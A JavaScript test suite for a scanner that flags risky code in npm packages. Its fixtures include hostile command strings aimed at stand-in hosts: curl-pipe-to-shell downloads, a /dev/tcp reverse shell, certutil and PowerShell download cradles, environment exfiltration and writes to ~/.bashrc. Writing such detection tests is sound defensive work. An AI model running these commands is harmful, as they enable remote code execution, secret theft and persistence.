import assert from 'node:assert/strict'
import { test } from 'node:test'
import { npmRunsCode, npmRunsCodeFlags } from '../risk/files/runs-code.js'

const found = (path, text) => {
  const runs = npmRunsCode(path, text)
  return runs && Object.fromEntries(runs)
}

test('a script is read for eval, Function and child_process, each with the lines it is on', () => {
  assert.deepEqual(found('a.js', 'const y = (0, eval)(code)\nwindow.eval(a)\nglobalThis . eval(b)\nglobalThis?.eval(c)\n'), { eval: [1, 2, 3, 4] })
  assert.deepEqual(found('a.js', 'new Function("return payload")()\nconst f = Function("a", "b")\nnew window.Function(c)\n'),
    { function: [1, 2, 3] }, 'with new or without, as the global object\'s too')
  assert.equal(found('a.js', 'var root = freeGlobal || freeSelf || Function(\'return this\')();\nvar g = new Function("return this;")()\nvar h = Function( /* c */ ` return this ` )()\n'), null,
    'not to find the global object, as lodash and core-js do')
  assert.deepEqual(found('a.js', 'Function(\'return this.x\')()\nFunction(\'return (async function(){}).constructor;\')()\nFunction(\'a\', \'return this\')\n'
    + 'Function("return this" + s)()\nFunction(\'return this\', x)\n'), { function: [1, 2, 3, 4, 5] }, 'but where it does more, or is made of more')
  assert.deepEqual(found('a.js', 'Function?.("return payload")()\nglobalThis.Function?.("x")()\nFunction.call(null, "y")\nFunction.apply(null, ["z"])\neval?.(w)\n'),
    { eval: [5], function: [1, 2, 3, 4] }, 'called optionally, or by its call or apply')
  assert.deepEqual(found('a.js', 'window?.Function("x")()\nself?.Function?.("y")()\n'), { function: [1, 2] }, 'the global object\'s, reached optionally')
  assert.deepEqual(found('a.js', 'Function/* webpack */("return payload")()\nnew Function// note\n("x")\nf(...eval(y))\n'), { eval: [4], function: [1, 2] },
    'a comment before its arguments, and spread')
  assert.deepEqual(found('a.js', 'globalThis /* webpack */ . eval(payload)\nwindow/* note */.Function("x")()\n'), { eval: [1], function: [2] },
    'a comment in the global object\'s access')
  assert.deepEqual(found('a.js', 'require ( \'child_process\' )\n__require("child_process")\nimport \'node:child_process\'\nexport { spawn } from "child_process"\n'),
    { 'child-process': [1, 2, 3, 4] }, 'loaded however a module is')
  assert.deepEqual(found('a.js', 'require?.("child_process")\n__require ?. (\'child_process\')\n'), { 'child-process': [1, 2] }, 'required optionally')
  assert.deepEqual(found('a.ts', 'require/* bundled */(\'child_process\')\nawait import(/* webpackIgnore: true */ \'child_process\')\nimport type from \'child_process\'\nimport type { A } from \'a\'\nimport { spawn } from \'child_process\'\n'),
    { 'child-process': [1, 2, 3, 5] }, 'comments in how it is loaded; a default named type, and a load after a type-only one')
  assert.deepEqual(found('a.mjs', "import { spawn } from 'node:child_process'\nconst cp = require(\"child_process\")\nawait import(`child_process`)\n"),
    { 'child-process': [1, 2, 3] }, 'a module named by the string that names it, required or imported')
  assert.deepEqual([...npmRunsCode('a.ts', 'npm_publish("npm publish")\nsend(JSON.stringify(process.env))\nprocess.env.NPM_TOKEN\nimport cp from "child_process"\nm._compile(s)\nimport vm from "vm"\nFunction(y)\neval(x)\n')],
    [['eval', [8]], ['function', [7]], ['vm', [6]], ['compile', [5]], ['child-process', [4]], ['tokens', [3]], ['env', [2]], ['publish', [1]]], 'in RUNS_CODE\'s order')
  assert.deepEqual(found('a.js', 'eval(a); eval(b)\n\neval(c)\n'), { eval: [1, 3] }, 'a line once')
  assert.deepEqual(found('bin/cli', '#!/usr/bin/env node\nrequire("child_process").execSync("ls")\n'), { 'child-process': [2] },
    'a script node runs by its hashbang, with no extension')
  assert.deepEqual(found('bin/cli', '\uFEFF#!/usr/bin/env node\nrequire("child_process").execSync("ls")\n'), { 'child-process': [2] },
    'its hashbang after a byte order mark, as node runs it as an ES module')
  assert.deepEqual(found('a.mjs', '\uFEFF#!/usr/bin/env node `\neval(a)\n// `\n'), { eval: [2] },
    'a hashbang after a byte order mark a comment too, a backtick in it opening no template')
})

test('a file\'s kinds as its flags, a shared tag once, the whole environment, publishing and persistence critical', () => {
  assert.deepEqual(npmRunsCodeFlags(npmRunsCode('a.js', 'eval(a)\nFunction(b)\nrequire("vm")\nsend(JSON.stringify(process.env))\nexecSync("npm publish")\nreadFileSync(".npmrc")\n')),
    [{ name: 'eval', severity: 'high' }, { name: 'credentials', severity: 'high' }, { name: 'whole env', severity: 'critical' }, { name: 'publish', severity: 'critical' }])
  assert.deepEqual(npmRunsCodeFlags(npmRunsCode('a.js', 'exec("curl https://x.example/p | sh")\nappendFileSync("~/.bashrc", x)\n')),
    [{ name: 'shell', severity: 'high' }, { name: 'persistence', severity: 'critical' }])
  assert.deepEqual(npmRunsCodeFlags(null), [], 'none for none')
})

test('vm loaded, and Module\'s _compile called or hooked, run a string as code', () => {
  assert.deepEqual(found('a.js', 'const vm = require(\'vm\')\nimport { runInNewContext } from \'node:vm\'\nmodule._compile(source, filename)\nModule.prototype._compile = function () {}\nm . _compile(s)\n'),
    { vm: [1, 2], compile: [3, 4, 5] })
  assert.equal(found('a.js', 'const name = \'vm\'\nobj.vm\nx._compiled\n// require(\'vm\')\nconst _compile = 1\n'), null, 'a module named, not loaded, and other names')
  assert.deepEqual(found('a.ts', 'type Compile = typeof Module.prototype._compile\nconst original = Module.prototype._compile\nif (m._compile === f) g()\noriginal.call(this, s)\nm._compile.call(m, s, f)\n'),
    { compile: [5] }, 'not named in a type, kept or compared, only called or hooked')
})

test('credentials: a credential file\'s path, a token\'s name; and the environment read out whole', () => {
  assert.deepEqual(found('a.js', 'fs.readFileSync(path.join(os.homedir(), \'.npmrc\'))\nconst key = \'~/.ssh/id_rsa\'\nconst aws = `${home}/.aws/credentials`\n'
    + 'process.env.NPM_TOKEN\nprocess.env[\'GITHUB_TOKEN\']\nconst { NPM_TOKEN } = process.env\n'), { 'credential-files': [1, 2, 3], tokens: [4, 5, 6] })
  assert.deepEqual(found('a.js', 'const github = (await import(\'@preventive/upstream/github.js\')).createClient({ token: process.env.GITHUB_TOKEN || null })\n'
    + 'client ?? createClient({ token: env.GITHUB_TOKEN || null })\nexec(\'curl -H "Authorization: token $GITHUB_TOKEN" https://api.github.com\')\n'
    + 'write(\'//registry.npmjs.org/:_authToken=${NPM_TOKEN}\')\nexec(\'echo %NPM_TOKEN%\')\n'), { tokens: [1, 2, 3, 4, 5], shell: [3] }, 'a token\'s value read, or expanded by a shell or .npmrc')
  assert.equal(found('a.js', 'if (repoAdvisories && !process.env.GITHUB_TOKEN) fail(\'Error: --repo-advisories requires a GitHub token in GITHUB_TOKEN\')\n'
    + 'delete process.env.NPM_TOKEN\nif (! env . NPM_TOKEN) ask()\nif (!process.env[\'NPM_TOKEN\']) ask()\ndelete process.env [ "GITHUB_TOKEN" ]\n'
    + 'if (!(process.env.GITHUB_TOKEN)) ask()\nif (!( process.env[\'NPM_TOKEN\'] )) ask()\ndelete (process.env.NPM_TOKEN)\n'
    + 'process.env.NPM_TOKEN = token\nconst GITHUB_TOKEN = input\nprocess.env[\'NPM_TOKEN\'] = token\n'), null,
    'its absence told, the token dropped or only set, dotted or as a key, and text naming it')
  assert.deepEqual(found('a.js', 'process.env.NPM_TOKEN ||= ask()\nif (process.env.GITHUB_TOKEN === x) f()\nconst { NPM_TOKEN = \'\' } = process.env\n'
    + 'const { a, GITHUB_TOKEN = null } = process.env\nprocess.env[\'NPM_TOKEN\'] ??= ask()\nconst NPM_TOKEN = process.env.NPM_TOKEN\n'), { tokens: [1, 2, 3, 4, 5, 6] },
    'read as it is set, compared, or destructured with a default')
  assert.equal(found('a.ts', 'const NPM_TOKEN: string = input\nlet GITHUB_TOKEN\nvar  NPM_TOKEN: string\ninterface ProcessEnv { GITHUB_TOKEN?: string }\n'
    + 'interface Env { NPM_TOKEN: string | undefined; GITHUB_TOKEN : string }\nfunction f(NPM_TOKEN: string) {}\n'), null,
    'declared, typed or not, or a member or parameter typed')
  assert.deepEqual(found('a.ts', 'const { NPM_TOKEN: token } = process.env\nconst t = x ? NPM_TOKEN : y\nif (!(process.env.NPM_TOKEN)()) ask()\n'
    + 'const {\n        NPM_TOKEN = \'\',\n} = process.env\nconst u = x ? process.env.GITHUB_TOKEN : undefined\n'), { tokens: [1, 2, 3, 5, 7] },
    'destructured under another name or with a default on a line of its own, chosen in a ternary, or called')
  assert.deepEqual(found('a.js', 'if (!process.env.GITHUB_TOKEN.trim()) ask()\nif (!process.env[\'GITHUB_TOKEN\'].length) ask()\nif (!env.NPM_TOKEN?.length) ask()\n'
    + 'if (!process.env.NPM_TOKEN [0]) ask()\ndelete process.env.NPM_TOKEN.x\nif (!(process.env.GITHUB_TOKEN === expected)) ask()\n'
    + 'if (!(process.env.GITHUB_TOKEN).trim()) ask()\nif (!(process.env[\'GITHUB_TOKEN\'] === x)) ask()\nif (!( (process.env[\'NPM_TOKEN\']) ) .length) ask()\n'),
  { tokens: [1, 2, 3, 4, 5, 6, 7, 8, 9] }, 'what is read of it, or compared, though negated')
  assert.equal(found('a.js', 'if (!process.env.GITHUB_TOKEN || !env.NPM_TOKEN) ask()\nconst none = !process.env.GITHUB_TOKEN ? 1 : 2\nreturn !process.env.NPM_TOKEN\n'
    + 'f({ missing: !env.GITHUB_TOKEN, x })\nconst t = `${!env.NPM_TOKEN}`\nif (!(process.env[\'NPM_TOKEN\'] ?? x)) ask()\n'), null, 'negated whole, whatever follows')
  assert.deepEqual(found('a.js', 'const token = process.env[\'NPM_TOKEN\']\nif (process.env?.[\'GITHUB_TOKEN\']) use()\nif (!check(process.env.GITHUB_TOKEN)) ask()\n'),
    { tokens: [1, 2, 3] }, 'read as a key, or handed on')
  assert.deepEqual(found('a.js', 'post(JSON.stringify(process.env))\nObject.entries(process.env)\nnew URLSearchParams(process.env)\nObject.values( process . env )\n'),
    { env: [1, 2, 3, 4] }, 'the environment\'s values read out whole, a kind of its own')
  assert.deepEqual(found('a.js', 'fetch(url, { body: JSON.stringify({ ...process.env }) })\nnew URLSearchParams({ ...process.env, host })\n'), { env: [1, 2] },
    'a copy of them read out')
  assert.equal(found('a.js', 'process.env.NODE_ENV\nspawn(c, { env: process.env })\nspawn(c, { env: { ...process.env, X: 1 } })\nif (\'HOME\' in process.env) f()\n'
    + 'JSON.stringify(process.env.X)\nObject.values(process.env[name])\nObject.keys(process.env).filter(key => /^debug_/iu.test(key))\nfor (const name in process.env) f(name)\n'), null,
    'one variable, the environment handed to a program, or its names listed')
  assert.equal(found('a.js', 'const proxy = Object.entries(process.env).reduce((found, [key, value]) => found, {})\n'
    + 'Object.values(process.env).some(value => value === x)\nObject.entries( process.env )\n  .filter(([key]) => key.startsWith(\'APP_\'))\n'), null,
    'its entries or values picked among as they are read, as npm\'s agent finds its proxy\'s')
  assert.deepEqual(found('a.js', 'Object.entries(process.env).map(([k, v]) => `${k}=${v}`)\nfor (const [k, v] of Object.entries(process.env)) send(k, v)\n'),
    { env: [1, 2] }, 'not where they are turned or looped over')
  assert.equal(found('a.js', '// export NPM_TOKEN=…\nconst s = \'project.npmrc s3.amazonaws.com MY_NPM_TOKEN .sshd\'\nconst re = /\\.npmrc$/u\n'), null,
    'in a comment, or a name or path of another')
  assert.equal(found('a.js', 'const x = `${/* NPM_TOKEN */ value}`\nconst y = `a ${/npm publish/.test(s)} b`\n'), null,
    'in a template\'s substitution\'s comment or regular expression, its code read as code')
  assert.deepEqual(found('a.js', 'const p = `${home}/.npmrc`\nconst q = `${f(\'~/.ssh\')} and ${x}`\nconst t = `\n${y}\nnpm publish`\n'), { 'credential-files': [1, 2], publish: [5] },
    'in a template\'s text, and in a string in its substitution, on its own line')
})

test('publishing: npm publish, the registry\'s whoami, libnpmpublish, a PUT where the file names the registry\'s URL', () => {
  assert.deepEqual(found('a.js', 'execSync(\'npm publish --access public\')\nspawn(\'npm\', [\'publish\'])\nconst c = `pnpm publish ${dir}`\n'
    + 'fetch(\'https://registry.npmjs.org/-/whoami\', { headers })\nconst { publish } = require(\'libnpmpublish\')\n'), { publish: [1, 2, 3, 4, 5] })
  assert.deepEqual(found('a.js', 'const registry = \'https://registry.npmjs.org/\'\nfetch(registry + name, { method: \'PUT\', body })\naxios.put(url, body)\noptions.method = "put"\n'),
    { publish: [2, 3, 4] }, 'a PUT, the registry named in the file')
  assert.deepEqual(found('a.js', 'spawn(\'npm\', [/* explain */ \'publish\'])\nexecFile("pnpm", // why\n  ["publish"])\nspawn(\'npm\', [run, \'publish\'])\n'), { publish: [1, 3] },
    'comments between its program and arguments, not another argument')
  assert.deepEqual(found('a.js', 'execSync(\'npm --silent publish\')\nexecSync(`npm --tag=next --access public publish ${dir}`)\nspawn(\'npm\', [\'--tag\', \'next\', \'publish\'])\nspawn(\'npm\', [\'--silent\', \'publish\'])\n'),
    { publish: [1, 2, 3, 4] }, 'npm\'s options before it, and their values')
  assert.equal(found('a.js', 'spawn(\'npm\', [\'install\', \'publish\'])\nexecSync(\'npm install publish\')\n'), null, 'another command\'s argument named publish')
  assert.equal(found('a.js', 'fetch(url, { method: \'PUT\' })\naxios.put(url, body)\nbus.publish(\'topic\')\nconst commands = [\'publish\']\n'), null,
    'a PUT where the file names no registry, and publish not run by npm')
  assert.equal(found('a.js', 'const methods = [\'GET\', \'PUT\']\nconst registry = \'https://registry.npmjs.org/\'\nfetch(registry + \'-/v1/search\')\n'), null,
    'PUT named, not a request\'s method')
  assert.deepEqual(found('a.js', 'fetch(url, { method: \'PUT\', body })\nwrite(`//registry.npmjs.org/:_authToken=${token}`)\n'), { publish: [1] }, '.npmrc\'s URL')
  for (const url of ['\'https://user:pass@registry.npmjs.org/pkg\'', '`https://${token}@registry.npmjs.org/${name}`', '"https://@registry.yarnpkg.com/x"',
    '\'https:\\/\\/registry.npmjs.org/pkg\'', '\'https:\\x2f\\x2fregistry.npmjs.org/pkg\'', '\'https:\\u002F\\u002Fregistry.npmjs.org\'', '\'https:\\u{2f}\\u{2f}registry.npmjs.org\'',
    '\'https://token\\x40registry.npmjs.org/pkg\'', '\'https://token\\u0040registry.npmjs.org\'', '\'https://t\\u{40}registry.npmjs.org\'',
    '\'https:\\\\\\\\registry.npmjs.org/pkg\'', '\'https:\\\\/registry.npmjs.org\'', '\'https:\\x5c\\x5cregistry.npmjs.org/pkg\'',
    '\'https:registry.npmjs.org/pkg\'', '\'https\\x3aregistry.npmjs.org/pkg\'', '\'https\\u003Aregistry.npmjs.org\'',
    '\'https://\\\nregistry.npmjs.org/pkg\'', '"https://\\\r\nregistry.npmjs.org"', '\'https://\\\u2028registry.npmjs.org\'',
    '\'https:\\057\\057registry.npmjs.org/pkg\'', '\'https://t\\100registry.npmjs.org\'', '\'https\\072//registry.npmjs.org\'',
    '\'https://user:p@ss@registry.npmjs.org/pkg\'', '\'https://\\nregistry.npmjs.org/pkg\'', '\'https:/\\t/\\rregistry.npmjs.org\'',
    '"https://user\'pass@registry.npmjs.org/pkg"', '\'https://us\\\'er@registry.npmjs.org\'']) {
    assert.deepEqual(found('a.js', `fetch(${url}, { method: 'PUT', body })\n`), { publish: [url.split(/\r\n|[\n\r]/u).length] },
      `a token before its host, its separators escaped or its line continued: ${url}`)
  }
  assert.deepEqual(found('a.js', 'const HOST = \'registry.npmjs.org\'\nfetch(couch(user), { method: \'PUT\', body })\n'), { publish: [2] }, 'its host a string\'s whole, as npm-profile names it')
  assert.deepEqual(found('a.js', 'const registry = \'https://\' + \'registry.npmjs.org/\'; fetch(registry + name, { method: \'PUT\' })\nconst port = \'registry.npmjs.org:443\'\n'),
    { publish: [1] }, 'its host starting a string before its path or port, as a URL joined')
  for (const host of ['\'registry.npmjs.org?write=true\'', '\'registry.npmjs.org#x\'']) {
    assert.deepEqual(found('a.js', `fetch('https://' + ${host}, { method: 'PUT' })\n`), { publish: [1] }, `its query or fragment after it: ${host}`)
  }
  assert.equal(found('a.js', 'fetch(storage, { method: \'PUT\', body })\nlog(\'registry.npmjs.org is down\')\nlog(\'(registry.npmjs.org), *registry.npmjs.org*\')\n'
    + 'log(\'"registry.npmjs.org" my-registry.npmjs.org a.registry.npmjs.org\')\nconst cr = \'\\registry.npmjs.org\'\n'
    + 'log(\'[registry.npmjs.org] is npm, {registry.npmjs.org},registry.npmjs.org;registry.npmjs.org <registry.npmjs.org>\')\n'
    + 'log(\'note:registry.npmjs.org is down\')\nmail(\'user@registry.npmjs.org\')\nopen(\'docs/registry.npmjs.org.md\')\n'
    + 'go(\'https://example.com?next=a@registry.npmjs.org\')\ngo(\'https://example.com#a@registry.npmjs.org\')\n'), null,
    'not prose, starting with it or naming it, nor another host, nor a carriage return')
  assert.equal(found('a.js', 'fetch(storage, { method: \'PUT\', body })\nconst consent = html`<p>sent to <span class="mono">registry.npmjs.org</span> to look up advisories</p>`\n'
    + 'log(\'asks registry.npmjs.org\')\n'), null, 'the registry\'s host in prose, as a dialog tells where it asks, beside a PUT to elsewhere')
})

test('shell commands fetching or handing off code, in a script\'s strings', () => {
  assert.deepEqual(found('a.js', [
    'execSync("curl -fsSL https://evil.example/x -o /tmp/x")',
    "exec(`wget -q http://1.2.3.4/p.sh`)",
    'execSync("cat x | sh")',
    'spawn("powershell -NoP -W Hidden -enc AAAA")',
    'exec("RunDll32.exe x.dll,Main")',
    'execSync("osascript -e \'do shell script\'")',
    'exec("certutil.exe -urlcache -f http://1.2.3.4/x.exe x.exe")',
    'exec("bitsadmin /transfer job http://1.2.3.4/x.exe C:\\x.exe")',
    'exec("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")',
    'exec("mshta http://1.2.3.4/x.hta")',
  ].join('\n')), { shell: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] }, 'Windows\' in any case')
  assert.deepEqual(found('a.js', 'exec("/usr/bin/curl -s https://evil.example/p")\nexec("/usr/bin/osascript -e x")\nexec("C:\\\\Windows\\\\System32\\\\rundll32.exe x.dll,Main")\n'),
    { shell: [1, 2, 3] }, 'by its path')
  assert.deepEqual(found('a.js', 'execSync("cat payload|sh")\nexec(`cat install.sh |sudo bash`)\n'), { shell: [1, 2] }, 'a pipe without spaces')
  assert.deepEqual(found('a.js', 'execSync("cat hash | sh")\n'), { shell: [1] }, 'a word ending in sh before the pipe, no shell\'s')
  assert.deepEqual(found('a.js', 'execSync("base64 -d payload | ksh")\nexec("cat p | fish")\nexec("cat p | pwsh -")\nexec("cat p | ash")\n'), { shell: [1, 2, 3, 4] }, 'any shell after a pipe')
  assert.deepEqual(found('a.js', 'execSync("cat payload | /bin/sh")\nexec("base64 -d p|/usr/bin/env bash")\nexec("cat p | env zsh")\nexec("cat p | env MODE=x -i bash")\nexec("cat p | /usr/bin/env -S bash")\nexec("cat p | env -u NODE_OPTIONS bash")\nexec("cat p | env --unset=NODE_OPTIONS bash")\n'), { shell: [1, 2, 3, 4, 5, 6, 7] },
    'a shell after a pipe by its path or env\'s')
  assert.deepEqual(found('a.js', 'execSync("cat payload | sudo -E bash")\nexec("cat p | sudo -u root /bin/sh")\nexec("cat p | sudo apt install x")\nexec("cat p | sudo -u root -- bash")\n'), { shell: [1, 2, 4] },
    'sudo\'s options before the shell, and sudo running no shell')
  assert.deepEqual(found('setup.fish', 'curl -s https://evil.example/x | source\n'), { shell: [1] }, 'any shell\'s script by its extension')
  assert.deepEqual(found('login.csh', 'echo "/tmp/x" >> ~/.bashrc\n'), { persistence: [1] })
  assert.deepEqual(found('setup.sh', 'curl -fsSL \\\n  https://evil.example/p -o /tmp/p\n'), { shell: [1] }, 'a line continued')
  assert.deepEqual(found('setup.sh', 'curl\\\n  https://evil.example/p -o /tmp/p\n'), { shell: [1] }, 'continued right after the program')
  assert.deepEqual(found('setup.sh', `curl -H "Authorization: Bearer ${'x'.repeat(1500)}" https://evil.example/p\n`), { shell: [1] }, 'long options before the URL')
  assert.deepEqual(found('a.js', 'exec("curl https:\\/\\/evil.example/x")\nspawn("curl", ["https:\\/\\/evil.example/x"])\n'), { shell: [1, 2] }, 'a URL\'s slashes escaped')
  assert.deepEqual(found('setup.sh', 'curl ftp://evil.example/p -o /tmp/p\nwget sftp://evil.example/q\n'), { shell: [1, 2] }, 'a URL fetched over FTP')
  assert.deepEqual(found('setup.bat', 'certutil -f ^\r\n  -urlcache http://1.2.3.4/x.exe x.exe\r\n'), { shell: [1] }, 'cmd\'s line continued')
  assert.deepEqual(found('a.js', 'exec(`wget -q \\\n  http://1.2.3.4/p`)\n'), { shell: [1] }, 'a template literal\'s line continued')
  assert.deepEqual(found('a.js', [
    'spawn("curl", ["-fsSL", "https://evil.example/x"])',
    "spawnSync('/usr/bin/wget', [/* quiet */ '-q', 'http://1.2.3.4/p'])",
    'execFile("C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\PowerShell.exe", ["-NoP", "-enc", payload])',
    'spawn("certutil", ["-urlcache", "-f", "http://1.2.3.4/x.exe"])',
    'spawn("curl", ["-o", outputPath, options.flag, "https://evil.example/x"])',
    'spawn("curl", ["-o", outputs[i], options?.flag, "https://evil.example/x"])',
  ].join('\n')), { shell: [1, 2, 3, 4, 5, 6] }, 'a program run with its arguments apart, a variable\'s or a property\'s value between')
  assert.deepEqual(found('a.js', `spawn("curl", ["-H", "Authorization: Bearer ${'x'.repeat(600)}", "https://evil.example/p"])\n`), { shell: [1] }, 'a long argument before the URL')
  assert.equal(found('a.js', [
    'const shells = "bash|zsh|sh"',
    'const also = "bash | zsh | sh"',
    "const plural = new RegExp('(x|ch|ss|sh)es$', 'gi')",
    'exec("test -x ./run || sh ./run")',
    'console.log("install curl first")',
    'spawn("powershell", args)',
    'spawn("curl", ["--version"])',
    'spawn("curl", [url])',
    'const u = "https://example.com"',
    'const tools = ["curl", "wget"]; const home = "https://example.com"',
    'exec("curl --version; echo https://example.com")',
    'exec("curl --help || printf https://example.com")',
    'exec("which curl && open https://example.com")',
    'const help = `curl',
    '  https://example.com is where to look`',
    '// curl https://example.com | sh',
    'const re = /curl https:\\/\\/x/',
  ].join('\n')), null, 'a list of shells, an or, curl given no URL, PowerShell given no options here, a comment and a regular expression')
})

test('places code runs from again later: rc files, LaunchAgents, systemd user units, an agent\'s or editor\'s settings', () => {
  assert.deepEqual(found('a.js', [
    'appendFileSync(join(homedir(), ".bashrc"), line)',
    'const rc = "~/.zshrc"',
    'join(home, "Library", "LaunchAgents", "com.x.plist")',
    'exec("systemctl --user enable x.service")',
    'writeFileSync(`${home}/.config/systemd/user/x.service`, unit)',
    'writeFileSync(".claude/settings.json", hooks)',
    'writeFileSync(".vscode/tasks.json", tasks)',
  ].join('\n')), { persistence: [1, 2, 3, 4, 5, 6, 7] })
  assert.deepEqual(found('a.js', 'const dir = join(root, ".claude")\nwriteFileSync(join(dir, "settings.json"), hooks)\n'), { persistence: [1] },
    'a directory and its file named apart, as path.join takes them')
  assert.deepEqual(found('a.js', 'join(root, ".vscode", "tasks.json")\n'), { persistence: [1] })
  assert.deepEqual(found('a.js', 'const unit = join(home, ".config", "systemd",\n  "user", "x.service")\n'), { persistence: [1] }, 'a place\'s parts one after the other')
  assert.deepEqual(found('a.js', 'spawn("systemctl", ["--user", "enable", "x.service"])\nexecFile("/usr/bin/systemctl", ["--user", "enable", unit])\n'), { persistence: [1, 2] },
    'a command run with its arguments apart')
  assert.deepEqual(found('a.js', 'exec("systemctl --user --now enable x.service")\nexec("systemctl --now --user enable x")\nspawn("systemctl", ["--user", "--now", "enable", unit])\n'),
    { persistence: [1, 2, 3] }, 'systemctl\'s other options before its command')
  assert.deepEqual(found('a.js', 'exec("systemctl enable --user x.service")\nspawn("systemctl", ["enable", unit, "--user"])\n'), { persistence: [1, 2] }, '--user after its command')
  assert.equal(found('setup.sh', 'systemctl start nginx\necho --user\nsystemctl enable nginx; echo --user\nsystemctl start nginx | grep --user\n'), null, '--user on another line, or in another command')
  assert.equal(found('setup.sh', 'printf payload | env\nbash local.sh\n'), null, 'env and a shell on separate lines')
  assert.equal(found('setup.sh', 'systemctl --user\nenable x\nsystemctl\n--user\nenable y\n'), null, 'its options and command on other lines')
  assert.equal(found('setup.sh', 'systemctl --user start x.service\nsystemctl start --user y\n'), null, 'a unit started once, not enabled')
  assert.deepEqual(found('setup.sh', 'systemctl --user \\\n  enable x\n'), { persistence: [1] }, 'its line continued')
  assert.deepEqual(found('a.js', 'const files = [\n  "notes.txt",\n  ".bashrc",\n]\n'), { persistence: [3] }, 'a part naming a place alone, where it is')
  assert.deepEqual(found('a.js', 'writeFileSync(home + "/.profile", payload)\nexec("echo x >> ~/.profile")\njoin("/home/x", ".profile")\nwriteFileSync(join(home, ".bash_login"), p)\nexec("echo x >> ~/.zshenv")\nwriteFileSync(path.join(os.homedir(), \'.profile\'), p)\nresolve(process.env.HOME, ".profile")\n'), { persistence: [1, 2, 3, 4, 5, 6, 7] },
    '.profile in a path, .bash_login, .zshenv')
  assert.equal(found('a.js', 'document.querySelector(".profile")\nconst selectors = [".nav", ".profile"]\nconst rule = ".nav/.profile"\njoin(dir, ".profile")\n'), null, '.profile a selector\'s class, or joined to no home')
  assert.deepEqual(found('a.js', 'writeFileSync(home + "\\\\.claude\\\\settings.json", hooks)\nwriteFileSync(root + "\\.vscode\\tasks.json", t)\n'), { persistence: [1, 2] },
    'a Windows path, its backslashes escaped in a string as code writes them, or not')
  assert.deepEqual(found('a.js', 'writeFileSync(".claude\\/settings.json", hooks)\nconst unit = "~/.config/systemd\\/user/x.service"\n'), { persistence: [1, 2] }, 'a slash escaped')
  assert.deepEqual(found('a.js', 'writeFileSync(home + "\\\\.VSCODE\\\\TASKS.JSON", t)\njoin(home, ".Claude", "Settings.json")\nconst p = "~/Library/launchagents/x.plist"\n'),
    { persistence: [1, 2, 3] }, 'in any case, as Windows\' and macOS\'s paths are')
  for (const text of ['join(root, ".vscode", "settings.json")', 'const s = "settings.json"', 'const dir = ".claude"', 'const cls = "user.bashrc"',
    'const inits = ["systemd", "upstart"], who = "user"', 'spawn("systemctl", ["status", unit])', 'spawn("systemctl", ["--user", "status"])']) {
    assert.equal(found('a.js', text), null, `an editor's own settings, a file or a directory alone, a name ending in one: ${text}`)
  }
})

test('a shell script is read whole for its shell commands and the places it names', () => {
  assert.deepEqual(found('setup.sh', 'curl -s http://1.2.3.4/x -o /tmp/x && chmod +x /tmp/x\necho "/tmp/x" >> ~/.bashrc\n'), { shell: [1], persistence: [2] })
  assert.deepEqual(found('preinstall.bat', '@echo off\ncertutil.exe -urlcache -f http://1.2.3.4/x.exe x.exe\nrundll32 x.dll,Main\n'), { shell: [2, 3] })
  assert.deepEqual(found('bin/install', '#!/usr/bin/env bash\nwget https://x.example/p | bash\n'), { shell: [2] }, 'by its hashbang, with no extension')
  assert.deepEqual(found('dotfiles/.bashrc', 'curl -s https://evil.example/x | sh\n'), { shell: [1] }, 'a shell\'s startup file by its name')
  assert.deepEqual(found('bin/install', '#!/bin/ash\ncurl https://x.example/p -o /tmp/p\n'), { shell: [2] }, 'BusyBox\'s ash by its hashbang')
  assert.deepEqual(found('bin/install', '\uFEFF#!/bin/sh\ncurl https://x.example/p -o /tmp/p\n'), { shell: [2] }, 'a hashbang past a byte order mark')
  assert.equal(found('install.sh', '#!/bin/sh\n# Install: curl -fsSL https://x.example/i.sh | sh\n  # Do not modify ~/.bashrc\necho ok\n'), null, 'its comments')
  assert.equal(found('install.sh', 'echo ok # curl https://x.example/x\necho ok\t# do not modify ~/.bashrc\necho \'a # b\' # don\'t run "curl https://x.example/y"\necho ok;# curl https://x.example/z\necho "a \\" b" # curl https://x.example/w\n'), null,
    'a comment after a command, quotes before it closed, quotes in it')
  assert.deepEqual(found('setup.sh', 'rem() { curl https://evil.example/p; }\nrem\n'), { shell: [1] }, 'cmd\'s comments a batch file\'s alone')
  assert.equal(found('setup.ps1', '<#\n.EXAMPLE\n  curl https://x.example/install.ps1\n#>\nWrite-Host ok <# not ~/.bashrc #>\n<# unclosed\ncurl https://x.example\n'), null,
    'PowerShell\'s block comments, one unclosed to the end')
  assert.deepEqual(found('setup.ps1', '<# help #>\n# more\nWrite-Host ok\npowershell -enc AAAA\n'), { shell: [4] }, 'a command after them, where it is')
  assert.deepEqual(found('setup.ps1', '$a = "<#"\ncurl https://evil.example/x -o x\n$b = "#>"\n'), { shell: [2] }, 'a block\'s marks in strings')
  assert.equal(found('setup.ps1', 'Write-Host "a \u0060" b" # curl https://x.example/x\n'), null, 'a quote escaped by PowerShell\'s backtick')
  assert.equal(found('setup.ps1', '$x=<# curl https://x.example/x #>1\n$y=1,<# do not modify ~/.bashrc #>2\n'), null, 'a block comment after = or ,')
  assert.deepEqual(found('setup.ps1', [
    'iex (iwr https://evil.example/p.ps1).Content',
    'irm https://get.example | iex',
    "IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/x')",
    'Add-Content -Path $PROFILE -Value $payload',
    'Set-Content "$HOME\\Documents\\PowerShell\\Microsoft.PowerShell_profile.ps1" $p',
    'Invoke-WebRequest https://x.example/f -OutFile f',
    '$iex = 1; $irm = 2',
  ].join('\n')), { shell: [1, 2, 3], persistence: [4, 5] }, 'PowerShell running what it fetches, and its profile')
  assert.deepEqual(found('setup.ps1', 'Invoke-Expression \u0060\n  (Invoke-WebRequest https://evil.example/p).Content\nirm https://get.example \u0060\n  | iex\niex $x\niwr https://x.example/f -OutFile f\n'), { shell: [1, 3] },
    'its line continued by a backtick, not the next line')
  assert.equal(found('setup.sh', 'x=\u0060date\u0060 # curl https://x.example/x\n'), null, 'sh\'s backticks no escapes')
  assert.equal(found('bin/setup', '#!/usr/bin/env pwsh\n<# curl https://x.example/install #>\nWrite-Host ok\n'), null, 'PowerShell\'s comments by its hashbang')
  assert.deepEqual(found('install.sh', 'echo "a # curl https://x.example/x" | sh\necho ${#x} curl https://x.example/y\n'), { shell: [1, 2] }, 'a # quoted, or no comment\'s')
